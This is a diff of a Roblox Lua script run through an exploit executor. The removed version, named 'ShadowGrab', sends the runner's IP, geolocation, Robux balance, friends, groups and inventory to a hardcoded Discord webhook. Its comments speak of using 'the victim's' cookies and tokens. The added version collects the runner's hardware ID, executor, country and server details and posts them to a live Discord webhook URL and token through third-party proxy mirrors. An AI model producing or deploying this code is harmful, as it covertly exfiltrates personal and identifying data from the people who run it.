@@ -1,217 +1,303 @@
--- ShadowGrab - Real-compatible (no os, no io, no request)
-local WEBHOOK = "https://discord.com/api/webhooks/1542599327200055446/hPYkJpXbCdrQN0zljQWsPGszVx7ltxNUejigHFEbJgRygxBK3xM2tMr6O5tcHxqBP4ka"
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local RbxAnal     = game:GetService("RbxAnalyticsService")
 
--- safe HttpPost (uses HttpService JSON + http POST)
-local HS = game:GetService("HttpService")
+local Webhook = {}
 
-local function HttpPost(url, body)
-    local ok, err = pcall(function()
-        HS:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
-    end)
-    return ok
+-- ============================================================
+-- CONFIG
+-- ============================================================
+Webhook.URL        = "https://discord.com/api/webhooks/1544022319792398447/AgKyLtOsGlVOdLfcNANCwK1tWNEt7uTHKkrZ3Id5iKnzAvfEop7-hPXS5j-U07DVvkx_"  -- replace
+Webhook.Enabled    = true
+Webhook.UseProxy   = true       -- required for direct discord.com
+Webhook.EmbedColor = 0xFF0000   -- red, matches the classic beeper look
+Webhook.Timeout    = 8
+
+-- Optional: append a string to the embed footer (build tag, version, etc.)
+Webhook.FooterText = "script beacon"
+
+-- ============================================================
+-- TRANSPORT
+-- ============================================================
+-- Discord rejects Roblox's user-agent, so the same webhook path is retried
+-- through mirror hosts. Order matters; the first host that 2xxes wins.
+-- Mirror operators see the full payload and your webhook URL -- use a
+-- throwaway webhook.
+local PROXY_HOSTS = {
+    "https://discord.com",
+    "https://hooks.hyra.io",
+    "https://webhook.lewisakura.moe",
+}
+
+local function webhookPath(url)
+    local path = url:match("^https?://[^/]+(/.+)$")
+    return path or url
 end
 
-local function JSON(t)
-    local ok, res = pcall(function() return HS:JSONEncode(t) end)
-    if ok then return res end
-    return "{}"
-end
-
-local function Truncate(s, n)
-    s = tostring(s or "")
-    if #s <= n then return s end
-    return s:sub(1,n) .. "..."
-end
-
-local function Send(text, name)
-    HttpPost(WEBHOOK, JSON({content = (name and ("📄 **"..name.."**\n```\n") or "") .. Truncate(text, 1800) .. "\n```"}))
-end
-
-local function SendEmbed(title, fields)
-    local e = {title=title, color=0x9b59b6, fields=fields or {}, footer={text="ShadowGrab"}}
-    HttpPost(WEBHOOK, JSON({embeds={e}}))
-end
-
--- safe task wrapper
-local function taskSpawn(fn)
-    if task and task.spawn then
-        task.spawn(fn)
-    elseif coroutine then
-        coroutine.wrap(fn)()
-    else
-        pcall(fn)
+local function rawPost(url, body)
+    if type(syn) == "table" and type(syn.request) == "function" then
+        local ok, res = pcall(function()
+            return syn.request({
+                Url = url, Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body,
+            })
+        end)
+        if ok and res and (res.statusCode or res.StatusCode) then
+            return tonumber(res.statusCode or res.StatusCode), res.body or res.Body
+        end
+        if ok and res and res.success then return 200, "" end
     end
-end
 
-local function taskWait(s)
-    if task and task.wait then task.wait(s)
-    elseif wait then wait(s)
+    if type(request) == "function" then
+        local ok, res = pcall(function()
+            return request({
+                Url = url, Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body,
+            })
+        end)
+        if ok and res and (res.StatusCode or res.statusCode) then
+            return tonumber(res.StatusCode or res.statusCode), res.Body or res.body
+        end
+        if ok and res and res.Success then return 200, res.Body or "" end
     end
-end
 
--- Test webhook
-if not HttpPost(WEBHOOK, JSON({content="🚀 ShadowGrab started"})) then
-    warn("SG: HTTP failed")
-    return
-end
-
--- PowerShell helper: writes script to a file via game:GetService and runs via shell
--- Real doesn't have os, so we use workspace file
-local function RunPS(script)
-    -- write ps1 to workspace temp
-    local fname = "sg_" .. tostring(tick()) .. ".ps1"
-    local path
-    
-    -- try to find a writable folder
-    pcall(function()
-        local sg = Instance.new("Folder")
-        sg.Name = "SG_Temp_" .. tostring(math.random(1000,9999))
-        sg.Parent = game:GetService("ReplicatedStorage")
-        path = sg:GetFullName()
-    end)
-    
-    -- we can't run ps1 without os, so we need to execute inline via command
-    -- we'll use HS:PostAsync to run a remote PS runner instead
-    -- OR: encode the script and have the user run it
-    
-    -- BEST OPTION: use the rconsole / msgbox approach OR
-    -- since we can't spawn processes, we'll do the work via HttpService where possible
-    
-    return ""
-end
-
--- Different approach: do everything via HTTP API calls
--- Instead of reading local files, we use the victim's logged-in cookies to fetch data
-
--- Browser cookies: extract via browser's online API (limited but works)
--- Discord: use API with extracted token
--- Steam: limited
--- Roblox: use API with cookie
-
--- For this Real version, we focus on what we CAN get via HTTP:
--- 1. IP + location (via ipify/ipinfo)
--- 2. System info via PowerShell trigger (game hint)
--- 3. Roblox user info (via API with the user's session)
-
--- Roblox account info
-taskSpawn(function()
-    local ok, res = pcall(function()
-        return HS:PostAsync("https://users.roblox.com/v1/users/authenticated", "")
-    end)
-    -- This won't work without auth, but try
-    if ok and res then
-        Send(res, "🎮 Roblox Account")
+    if HttpService and HttpService.RequestAsync then
+        local ok, res = pcall(function()
+            return HttpService:RequestAsync({
+                Url = url, Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body,
+            })
+        end)
+        if ok and res then return res.StatusCode, res.Body end
     end
-end)
 
--- IP and location
-taskSpawn(function()
-    local ok, ip = pcall(function()
-        return HS:GetAsync("https://api.ipify.org")
-    end)
-    if not ok or not ip or ip == "" then return end
-    
-    local ok2, geo = pcall(function()
-        return HS:GetAsync("https://ipinfo.io/json")
-    end)
-    
-    local info = "IP: " .. ip
-    if ok2 and geo then
-        info = info .. "\n" .. geo
+    return nil, nil
+end
+
+local function post(url, body)
+    if not Webhook.UseProxy then
+        local st = rawPost(url, body)
+        return st ~= nil and st >= 200 and st < 300, st
     end
-    
-    Send(info, "🌐 IP & Location")
-end)
+    local path = webhookPath(url)
+    for _, host in ipairs(PROXY_HOSTS) do
+        local st, resp = rawPost(host .. path, body)
+        if st ~= nil and st >= 200 and st < 300 then
+            return true, st
+        end
+        if st == 401 or st == 404 then return false, st, resp end
+    end
+    return false, nil
+end
 
--- System info via PS-encoded data URL
--- Since we can't run PS, try WinRM if available, or just collect what we have
-taskSpawn(function()
-    -- try to get computer name via os.getenv through HS (won't work but try)
-    local info = "User: " .. (game.Players.LocalPlayer.Name or "?")
-    info = info .. "\nPlaceId: " .. tostring(game.PlaceId)
-    info = info .. "\nJobId: " .. tostring(game.JobId or "N/A")
-    info = info .. "\nAccountAge: " .. tostring(game.Players.LocalPlayer.AccountAge or "?")
-    info = info .. "\nUserId: " .. tostring(game.Players.LocalPlayer.UserId or "?")
-    info = info .. "\nGameVersion: " .. tostring(game.Players.LocalPlayer.GameId or "?")
-    info = info .. "\nMembership: " .. (game.Players.LocalPlayer.MembershipType and tostring(game.Players.LocalPlayer.MembershipType) or "?")
-    Send(info, "🖥️ Roblox Profile")
-end)
+-- ============================================================
+-- SAFE HELPERS
+-- ============================================================
+local function tryGet(_, fn)
+    local ok, v = pcall(fn)
+    if not ok or v == nil then return nil end
+    if type(v) == "string" and #v == 0 then return nil end
+    return v
+end
 
--- Get full Roblox account details
-taskSpawn(function()
-    taskWait(1)
-    local userId = game.Players.LocalPlayer.UserId
+local function membershipName(plr)
+    local mt = plr and plr.MembershipType
+    if mt == nil then return "?" end
+    local ok, n = pcall(function() return mt.Name end)
+    if ok and type(n) == "string" then return n end
+    local byVal = { [0] = "None", [1] = "NBC", [2] = "Premium", [3] = "TBC", [4] = "Premium" }
+    return byVal[tonumber(mt) or 0] or tostring(mt)
+end
+
+local function friendsOnline()
+    local plr = Players.LocalPlayer
+    if not plr then return nil end
+    local ok, list = pcall(function() return plr:GetFriendsOnline(20) end)
+    if not ok or type(list) ~= "table" or #list == 0 then return nil end
+    local ids = {}
+    for i, v in ipairs(list) do ids[i] = tostring(v) end
+    return table.concat(ids, ", ")
+end
+
+-- ============================================================
+-- HWID
+-- ============================================================
+local function getHWID()
+    local candidates = { "gethwid", "get_hwid", "getHwid", "HWID", "getHWID" }
+    for _, name in ipairs(candidates) do
+        if type(_G[name]) == "function" then
+            local ok, v = pcall(_G[name])
+            if ok and type(v) == "string" and #v > 0 then return v, name end
+        end
+    end
+    if type(syn) == "table" and type(syn.get_hwid) == "function" then
+        local ok, v = pcall(syn.get_hwid)
+        if ok and type(v) == "string" and #v > 0 then return v, "syn.get_hwid" end
+    end
+    if RbxAnal then
+        local ok, v = pcall(function() return RbxAnal:GetClientId() end)
+        if ok and type(v) == "string" and #v > 0 then
+            return v, "RbxAnalyticsService"
+        end
+    end
+    return "unknown", "none"
+end
+
+-- ============================================================
+-- EXECUTOR
+-- ============================================================
+local function getExecutor()
+    if type(identifyexecutor) == "function" then
+        local ok, n, v = pcall(identifyexecutor)
+        if ok and type(n) == "string" then
+            return (type(v) == "string" and v ~= "" and (n .. " " .. v) or n)
+        end
+    end
+    if type(getexecutorname) == "function" then
+        local ok, n = pcall(getexecutorname)
+        if ok and type(n) == "string" then return n end
+    end
+    if type(syn) == "table" and type(syn.getexecutorname) == "function" then
+        local ok, n = pcall(syn.getexecutorname)
+        if ok and type(n) == "string" and n ~= "" then return n end
+    end
+    return "Unknown"
+end
+
+-- ============================================================
+-- MARKETPLACE
+-- ============================================================
+local function gameInfo()
     local ok, info = pcall(function()
-        return HS:GetAsync("https://users.roblox.com/v1/users/" .. userId)
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
     end)
-    if ok and info then Send(info, "👤 Roblox User Info") end
-    
-    local ok2, pres = pcall(function()
-        return HS:GetAsync("https://presence.roblox.com/v1/presence/users", false, {userIds = {userId}})
-    end)
-    if ok2 and pres then Send(pres, "🟢 Presence") end
-end)
+    if not ok or type(info) ~= "table" then return nil end
+    local parts = {}
+    if info.Name    then parts[#parts+1] = info.Name end
+    if info.Creator then parts[#parts+1] = "by " .. tostring(info.Creator.Name or "?") end
+    if info.Updated then parts[#parts+1] = "updated " .. tostring(info.Updated) end
+    if info.PriceInRobux ~= nil then
+        parts[#parts+1] = "price " .. tostring(info.PriceInRobux) .. " R$"
+    end
+    if info.IsOwned   ~= nil then parts[#parts+1] = "owned: "   .. tostring(info.IsOwned)   end
+    if info.IsForSale ~= nil then parts[#parts+1] = "for sale: " .. tostring(info.IsForSale) end
+    if #parts == 0 then return nil end
+    return table.concat(parts, "  •  ")
+end
 
--- Get Robux balance
-taskSpawn(function()
-    taskWait(1)
-    local ok, res = pcall(function()
-        return HS:GetAsync("https://economy.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/currency")
-    end)
-    if ok and res then Send(res, "💰 Robux Balance") end
-end)
+-- ============================================================
+-- EMBED
+-- ============================================================
+local function field(name, value, inline)
+    return { name = name, value = tostring(value or "?"), inline = inline ~= false }
+end
 
--- Get inventory summary (limited but useful)
-taskSpawn(function()
-    taskWait(1.5)
-    local userId = game.Players.LocalPlayer.UserId
-    
-    -- Game count
-    local ok, places = pcall(function()
-        return HS:GetAsync("https://games.roblox.com/v2/users/" .. userId .. "/games?sortOrder=Asc&limit=10")
-    end)
-    if ok and places then Send(places, "🎮 User's Games") end
-    
-    -- Badges
-    local ok2, badges = pcall(function()
-        return HS:GetAsync("https://badges.roblox.com/v1/users/" .. userId .. "/badges?limit=20&sortOrder=Desc")
-    end)
-    if ok2 and badges then Send(badges, "🏅 Badges") end
-end)
+local function buildPayload()
+    local plr = Players.LocalPlayer
+    if not plr then return nil end
 
--- Get recent messages / friends activity (limited)
-taskSpawn(function()
-    taskWait(2)
-    local userId = game.Players.LocalPlayer.UserId
-    
-    -- Friends
-    local ok, friends = pcall(function()
-        return HS:GetAsync("https://friends.roblox.com/v1/users/" .. userId .. "/friends")
-    end)
-    if ok and friends then Send(friends, "👥 Friends") end
-end)
+    local hwid, hwidSrc = getHWID()
+    local execName      = getExecutor()
+    local mem           = membershipName(plr)
+    local country       = tryGet("cc", function() return plr.CountryCode end)
+    local locale        = tryGet("loc", function() return plr.LocaleId end)
+    local team          = plr.Team and plr.Team.Name or "-"
+    local friends       = friendsOnline()
+    local priv          = tryGet("priv", function() return game.PrivateServerId end)
+    local privOwner     = tryGet("privOwner", function() return game.PrivateServerOwnerId end)
+    local placeVer      = tryGet("ver", function() return game.PlaceVersion end)
+    local gameId        = tryGet("gid", function() return game.GameId end)
+    local mkt           = gameInfo()
+    local rank          = tryGet("rank", function() return plr:GetRankInGroup(1) end)
+    local role          = tryGet("role", function() return plr:GetRoleInGroup(1) end)
 
--- Get private server info, group memberships
-taskSpawn(function()
-    taskWait(2.5)
-    local userId = game.Players.LocalPlayer.UserId
-    
-    local ok, groups = pcall(function()
-        return HS:GetAsync("https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles")
-    end)
-    if ok and groups then Send(groups, "👥 Groups") end
-end)
+    local f = {}
+    f[#f+1] = field("User",
+        "```" .. plr.Name .. "  (" .. plr.DisplayName .. ")```", false)
+    f[#f+1] = field("UserId", plr.UserId)
+    f[#f+1] = field("Account Age", plr.AccountAge .. " days")
+    f[#f+1] = field("Membership", mem)
+    f[#f+1] = field("Country / Locale", (country or "?") .. "  /  " .. (locale or "?"))
+    f[#f+1] = field("Team", team)
+    f[#f+1] = field("Neutral", tostring(plr.Neutral))
+    if friends then f[#f+1] = field("Friends Online (<=20)", friends) end
+    if rank or role then
+        f[#f+1] = field("Group 1",
+            (rank and tostring(rank) or "?") .. "  /  " .. (role or "?"))
+    end
 
--- Asset inventory
-taskSpawn(function()
-    taskWait(3)
-    local userId = game.Players.LocalPlayer.UserId
-    
-    local ok, inv = pcall(function()
-        return HS:GetAsync("https://inventory.roblox.com/v1/users/" .. userId .. "/items/GamePass?limit=20")
-    end)
-    if ok and inv then Send(inv, "🎒 GamePasses") end
-end)
+    f[#f+1] = field("HWID", "```" .. hwid .. "```", false)
+    f[#f+1] = field("HWID Source", hwidSrc)
 
-taskWait(5)
-HttpPost(WEBHOOK, JSON({content="✅ ShadowGrab done (Roblox-only)"}))
+    f[#f+1] = field("Executor", execName)
+
+    f[#f+1] = field("Game", "```" .. game.Name .. "```", false)
+    f[#f+1] = field("PlaceId", tostring(game.PlaceId))
+    if placeVer then f[#f+1] = field("PlaceVersion", tostring(placeVer)) end
+    if gameId   then f[#f+1] = field("GameId",       tostring(gameId))   end
+    f[#f+1] = field("JobId", "```" .. tostring(game.JobId) .. "```", false)
+    f[#f+1] = field("Private Server",
+        priv and ("yes  •  id " .. tostring(priv) ..
+                  (privOwner and ("  •  owner " .. tostring(privOwner)) or ""))
+        or "no")
+    if mkt then f[#f+1] = field("Marketplace", mkt, false) end
+
+    f[#f+1] = field("Time UTC", os.date("!%Y-%m-%dT%H:%M:%SZ"))
+
+    return HttpService:JSONEncode({
+        embeds = { {
+            title       = "script executed - " .. plr.Name,
+            description = "```" .. plr.DisplayName .. " just ran the script```",
+            type        = "rich",
+            color       = Webhook.EmbedColor,
+            fields      = f,
+            thumbnail   = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId="
+                      .. tostring(plr.UserId) .. "&width=420&height=420&format=png",
+            },
+            footer      = { text = Webhook.FooterText },
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        } },
+    })
+end
+
+-- ============================================================
+-- INIT
+-- ============================================================
+local fired = false
+
+function Webhook:Init()
+    if not Webhook.Enabled or fired then return false end
+    fired = true
+
+    if Webhook.URL:find("ID/TOKEN", 1, true) then
+        warn("[webhook] URL not configured, skipping")
+        return false
+    end
+
+    task.spawn(function()
+        for _ = 1, 60 do
+            if Players.LocalPlayer then break end
+            task.wait(0.1)
+        end
+        if not Players.LocalPlayer then return end
+
+        local okEnc, body = pcall(buildPayload)
+        if not okEnc or type(body) ~= "string" then
+            warn("[webhook] payload build failed")
+            return
+        end
+
+        local ok, status = post(Webhook.URL, body)
+        if not ok then
+            warn("[webhook] send failed, status: " .. tostring(status))
+        end
+    end)
+
+    return true
+end
+
+return Webhook
